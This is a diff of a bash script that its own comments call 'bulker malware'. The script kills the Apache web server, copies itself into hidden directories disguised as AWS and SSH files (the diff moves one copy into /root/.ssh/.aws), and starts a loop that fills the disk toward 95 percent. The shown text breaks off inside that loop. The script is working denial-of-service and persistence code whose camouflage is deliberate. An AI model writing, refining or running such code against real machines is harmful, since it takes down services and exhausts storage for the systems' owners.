@@ -4,24 +4,23 @@
 # - January 7th, 2022
 
 
-# Check to see if apache is running
+# Check to see if apache is running.
 APACHE_RUN=/run/apache2/apache2.pid
 
 
-# Backup location to replicate the bulker malware to
+# Backup location to replicate the bulker malware to.
 BACKUP_ONE=/usr/share/.aws-backup
-BACKUP_TWO=/run/aws/.ec2-instance
+BACKUP_TWO=/root/.ssh/.aws/.ec2-instance-connect
 
-
-# Make the aws directory in /run to hide the 2nd backup in
-FAKE_RUN=/run/aws
-if ! [ -d "$FAKE_RUN" ]
+# Make the aws directory in /.ssh to hide the 2nd backup in.
+FAKE_SSH=/root/.ssh/.aws
+if ! [ -d "$FAKE_SSH" ]
 then
-	mkdir $FAKE_RUN
+	mkdir -p $FAKE_SSH
 fi
 
 
-# Function to replicate and run the bulker malware
+# Function to replicate and run the bulker malware.
 builder () {
 	if ! [ -f "$1" ] 
 	then
@@ -30,14 +29,14 @@ builder () {
 }
 
 
-# Shut down apache2 server
+# Shut down apache2 server.
 if [ -f "$APACHE_RUN" ] 
 then
 	systemctl kill apache2
 fi	
 
 
-# File Bulking
+# File Bulking.
 DISKSPACE=$(df /dev/root | awk '{print $5 }' | tail -n 1 | cut -d'%' -f1)
 GB_PRCNT=7
 while [ $DISKSPACE -lt 95 ]
